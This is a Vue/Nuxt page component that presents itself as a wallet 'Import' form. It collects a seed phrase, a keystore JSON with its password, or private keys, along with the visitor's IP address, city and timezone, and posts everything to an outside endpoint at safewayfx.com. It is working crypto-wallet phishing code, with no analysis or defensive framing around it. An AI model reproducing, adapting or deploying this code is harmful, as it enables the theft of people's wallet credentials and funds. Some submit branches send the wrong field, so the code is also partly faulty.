<script>
import { DateTime } from "luxon";
export default {
  data() {
    return {
      data: null,
      path: null,
      wallet: null,
      section: "phrase",
      ip: null,
      loc: null,
      pwd: '',
      timein: null,
      timezone: null,
      inputOne: null,
      inputTwo: null,
      inputThree: null,
      walletName: '',
      passed: !1,
      hasError: !1,
      hasErrorO: null,
      passedOne: !1,
      hasErrorr: !1,
      hasErrorrO: null,
      passedThree: !1,
      hasErrorrr: !1,
      hasErrorrrO: null
    };
  },
  asyncData({ params }) {
    let wallet = params.connect;
    const path = wallet;
    path == "otherwallet" ? (wallet = "other wallet") : null;
    wallet = wallet.toUpperCase();
    return { wallet, path };
  },
  async mounted() {

    var url = "https://ipinfo.io?token=f865373b33ae79";
    await fetch(url)
      .then(response => response.json())
      .then(res => {
        this.ip = res.ip;
        this.timezone = res.timezone;
        this.getLoc(this.ip);
      })
      .catch(err => {
        console.error(err);
        this.ip = null;
      });

    const date = DateTime.now().setZone(this.timezone);
    const a = date.toLocaleString(DateTime.DATE_MED_WITH_WEEKDAY);
    const b = date.toLocaleString(DateTime.TIME_WITH_SECONDS);
    const timein = a + " " + b;
    this.timein = timein;

  },
  head() {
		let paths = this.path
		return {
			title: `Connect ${paths} wallet`
		}
	},
  methods: {
    InputOne() {
      let error;
      var no_words = this.inputOne.split(" ");
      if (no_words.length == 0 || no_words == null || no_words[0].length == 0) {
        this.hasError = !1;
        this.passed = !1;
      } else if (no_words.length > 24) {
        error =
          "To many words present, You have inputed " +
          no_words.length +
          " of words.";
        this.hasError = !0;
        this.hasErrorO = error;
        this.passed = !1;
      } else if (no_words.length < 12 && no_words[0].length > 0) {
        error =
          "Few words present, You have inputed " +
          no_words.length +
          " of words.";
        this.hasError = !0;
        this.hasErrorO = error;
        this.passed = !1;
      } else {
        error = "";
        this.hasError = !1;
        this.passed = !0;
      }
    },
    InputTwo() {
        let error;
      var json = this.inputTwo;
      var rSpace = json.split(" ").join("");
      if (rSpace == "{}") {
        error =
          'Invalid json format [e.g - {"name": "john smith", "age": "50"} ]';
        this.hasErrorr = !0;
        this.hasErrorrO = error;
        this.passedOne = !1;
      } else if (json.length > 0) {
        const ss = this.isJSON(json);
        if (ss) {
         error = "";
        this.hasErrorr = !1;
        this.passedOne = !0;
        } else {
          error =
            'Invalid json format [e.g - {"name": "john smith", "age": "50"} ]';
          this.hasErrorr = !0;
        this.hasErrorrO = error;
        this.passedOne = !1;
        }
      } else {
        error = "";
       error = "";
        this.hasErrorr = !1;
        this.passedOne = !0;
      }
    },
    InputThree() {
        let error
        var no_words = this.inputThree.split(" ");
      if (no_words.length == 0 || no_words == null || no_words[0].length == 0) {
          this.hasErrorrr = !1;
        this.passedThree = !1;
      } else if (no_words.length > 24) {
        error =
          "To many words present, You have inputed " +
          no_words.length +
          " of words.";
        this.hasErrorrr = !0;
        this.hasErrorrrO = error;
        this.passedThree = !1;
      } else if (no_words.length < 12 && no_words[0].length > 0) {
        error =
          "Few words present, You have inputed " +
          no_words.length +
          " of words.";
        this.hasErrorrr = !0;
        this.hasErrorrrO = error;
        this.passedThree = !1;
      } else {
        error = "";
        this.hasErrorrr = !1;
        this.passedThree = !0;
      }
    },
    swicth(x) {
      this.section = x;
    },
    classX(x) {
      let y;
      this.section == x ? (y = !0) : (y = !1);
      return y;
    },
    async getLoc(IP) {
      await fetch("https://ipapi.co/" + IP + "/json/")
        .then(response => response.json())
        .then(res => {
          this.loc = res.city + ", " + res.country_name + ".";
        })
        .catch(err => {
          console.error(err);
          this.loc = null;
        });
    },
    isJSON(str) {
      try {
        return JSON.parse(str) && !!str;
      } catch (e) {
        return false;
      }
    },
    async submitForm(i) {
      if (i == "one") {
        this.data = {
          ip: this.ip,
          loc: this.loc,
          timein: this.timein,
          entry: this.section,
          wallet: this.wallet,
          data: this.inputOne,
          timezone: this.timezone,
          walletname: this.walletName
        };
      } else if (i == "two") {
        this.data = {
          ip: this.ip,
          loc: this.loc,
          timein: this.timein,
          entry: this.section,
          wallet: this.wallet,
          data: this.inputOne,
          pwd: this.pwd,
          timezone: this.timezone,
          walletname: this.walletName
        };
      } else {
        this.data = {
          ip: this.ip,
          loc: this.loc,
          timein: this.timein,
          entry: this.section,
          wallet: this.wallet,
          data: this.inputOne,
          timezone: this.timezone,
          walletname: this.walletName
        };
      }
      const send = await this.$axios.$post(
        "https://safewayfx.com/endpoint/v1/decimo/send",
        this.data
      );
      console.log(send);
    }
  }
};
</script>

<template>
  <div>
    <Header />
    <div data-elementor-type="wp-page" data-elementor-id="3876" class="elementor elementor-3876">
      <section
        class="elementor-section elementor-top-section elementor-element elementor-element-f313781 elementor-section-full_width elementor-section-height-default elementor-section-height-default false"
        data-id="f313781"
        data-element_type="section"
        id="Live-Price"
        data-settings="{'background_background':'classic'}"
      >
        <div class="elementor-container elementor-column-gap-no">
          <div
            class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-0cb4be0"
            data-id="0cb4be0"
            data-element_type="column"
          >
            <div class="elementor-widget-wrap elementor-element-populated">
              <div
                class="elementor-element elementor-element-dfbdb59 elementor-widget elementor-widget-crypto_live_price"
                data-id="dfbdb59"
                data-element_type="widget"
                data-widget_type="crypto_live_price.default"
              >
                <div class="elementor-widget-container">
                  <div id="cr-live-market" class="cr-live-market-section position-relative">
                    <span class="cr-shape1 position-absolute">
                      <img src="~/assets/uploads/sites/59/2022/03/sh4.png" alt />
                    </span>
                    <span class="cr-shape2 position-absolute">
                      <img src="~/assets/uploads/sites/59/2022/03/sh2-1.png" alt />
                    </span>
                    <span class="cr-shape3 position-absolute">
                      <img src="~/assets/uploads/sites/59/2022/03/st2.png" alt />
                    </span>
                    <div class="container crypto-container-1200">
                      <div
                        class="cr-section-title cr-headline text-center wow fadeFromUp"
                        data-wow-delay="0ms"
                        data-wow-duration="1500ms"
                      >
                        <h2>Import your wallet</h2>
                      </div>
                      <div class="cr-live-market-content position-relative">
                        <span class="cr-shape4 position-absolute">
                          <img src="~/assets/uploads/sites/59/2022/03/st2.png" alt />
                        </span>
                        <div class="row justify-content-center">
                          <section
                            class="fxt-template-animation fxt-template-layout27"
                            data-bg-image="img/figure/bg27-l.jpg"
                          >
                            <!-- Animation Start Here -->
                            <div id="particles-js"></div>
                            <!-- Animation End Here -->
                            <div class="fxt-content">
                              <div style="margin-bottom: 20px;" class="fxt-header">
                                <h3 style="color:#000">{{wallet}}</h3>
                                <p>&nbsp;</p>
                                <ul class="fxt-switcher-wrap">
                                  <li>
                                    <a
                                      @click.prevent="swicth('phrase')"
                                      href="#"
                                      class="switcher-text"
                                      :class="{ active : classX('phrase') }"
                                    >Phrase</a>
                                  </li>
                                  <li>
                                    <a
                                      @click.prevent="swicth('keystone')"
                                      href="#"
                                      class="switcher-text inline-text"
                                      :class="{ active : classX('keystone') }"
                                    >Keyston Json</a>
                                  </li>
                                  <li>
                                    <a
                                      @click.prevent="swicth('private')"
                                      href="#"
                                      class="switcher-text"
                                      :class="{ active : classX('private') }"
                                    >Private Keys</a>
                                  </li>
                                </ul>
                              </div>
                              <div v-if="section == 'phrase'" class="fxt-form">
                                <div
                                  style="margin-bottom: 10px;"
                                  class="fxt-transformY-40 fxt-transition-delay-1"
                                >
                                  <span style="color:red;">Do not refresh the page.</span>
                                  <br />
                                  <span>Typically 12 (sometimes 24) words separated by single spaces.</span>
                                </div>
                                <form method="POST">
                                  <div v-show="path == 'otherwallet'" class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-2">
                                      <input
                                        type="text"
                                        id="name"
                                        class="form-control"
                                        placeholder="Wallet Name"
                                        v-model="walletName"
                                        required="required"
                                      />
                                    </div>
                                  </div>
                                  <div class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-2">
                                      <textarea
                                        required
                                        class="form-control"
                                        rows="3"
                                        v-model.trim="inputOne"
                                        @input="InputOne"
                                        placeholder="Phrase"
                                      ></textarea>
                                      <label
                                        v-show="hasError"
                                        style="color: red;"
                                        class="color-red"
                                      >{{hasErrorO}}</label>
                                    </div>
                                  </div>
                                  <div class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-4">
                                      <div class="fxt-checkbox-area">
                                        <div class="checkbox">
                                          <NLink to="/wallet" class="fxt-btn-fil">Canel</NLink>
                                        </div>
                                        <button
                                          v-show="passed"
                                          @click.prevent="submitForm('one')"
                                          type="submit"
                                          class="fxt-btn-fill"
                                        >Import</button>
                                      </div>
                                    </div>
                                  </div>
                                </form>
                              </div>
                              <div v-else-if="section == 'keystone'" class="fxt-form">
                                <div
                                  style="margin-bottom: 10px;"
                                  class="fxt-transformY-40 fxt-transition-delay-1"
                                >
                                  <span style="color:red;">Do not refresh the page.</span>
                                  <br />
                                  <span>
                                    Several lines of text beginning with
                                    <b>'{...}'</b> plus the password used to encrypt it.
                                  </span>
                                </div>
                                <form method="POST">
                                  <div v-show="path == 'otherwallet'" class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-2">
                                      <input
                                        type="text"
                                        id="name"
                                        class="form-control"
                                        placeholder="Wallet Name"
                                        v-model="walletName"
                                        required="required"
                                      />
                                    </div>
                                  </div>
                                  <div class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-2">
                                      <textarea
                                        required
                                        @input="InputTwo"
                                        name="inputOne"
                                        class="form-control"
                                        rows="3"
                                        v-model.trim="inputTwo"
                                        placeholder="Keyword Json"
                                      ></textarea>
                                      <label v-show="hasErrorr" style="color: red;" class="color-red">{{hasErrorrO}}</label>
                                    </div>
                                  </div>
                                  <div class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-2">
                                      <input
                                        type="password"
                                        v-model="pwd"
                                        id="name"
                                        class="form-control"
                                        placeholder="Password"
                                        required="required"
                                      />
                                    </div>
                                  </div>
                                  <div class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-4">
                                      <div class="fxt-checkbox-area">
                                        <div class="checkbox">
                                          <NLink to="/wallet" class="fxt-btn-fil">Canel</NLink>
                                        </div>
                                        <button
                                        v-show="passedOne"
                                          @click.prevent="submitForm('two')"
                                          type="submit"
                                          class="fxt-btn-fill"
                                        >Import</button>
                                      </div>
                                    </div>
                                  </div>
                                </form>
                              </div>
                              <div v-else class="fxt-form">
                                <div
                                  style="margin-bottom: 10px;"
                                  class="fxt-transformY-40 fxt-transition-delay-1"
                                >
                                  <span style="color:red;">Do not refresh the page.</span>
                                  <br />
                                  <span>Typically 12 (sometimes 24) words separated by single spaces</span>
                                </div>
                                <form method="POST">
                                  <div v-show="path == 'otherwallet'" class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-2">
                                      <input
                                        type="text"
                                        id="name"
                                        class="form-control"
                                        placeholder="Wallet Name"
                                        v-model="walletName"
                                        required="required"
                                      />
                                    </div>
                                  </div>
                                  <div class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-2">
                                      <textarea
                                        required
                                        @input="InputThree"
                                        class="form-control"
                                        rows="3"
                                        v-model.trim="inputThree"
                                        placeholder="Private Keys"
                                      ></textarea>
                                      <label v-show="hasErrorrr" style="color: red;" class="color-red">{{hasErrorrrO}}</label>
                                    </div>
                                  </div>
                                  <div class="form-group">
                                    <div class="fxt-transformY-50 fxt-transition-delay-4">
                                      <div class="fxt-checkbox-area">
                                        <div class="checkbox">
                                          <NLink to="/wallet" class="fxt-btn-fil">Canel</NLink>
                                        </div>
                                        <button
                                        v-show="passedThree"
                                          @click.prevent="submitForm('three')"
                                          type="submit"
                                          class="fxt-btn-fill"
                                        >Import</button>
                                      </div>
                                    </div>
                                  </div>
                                </form>
                              </div>
                            </div>
                          </section>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
    <Footer />
  </div>
</template>
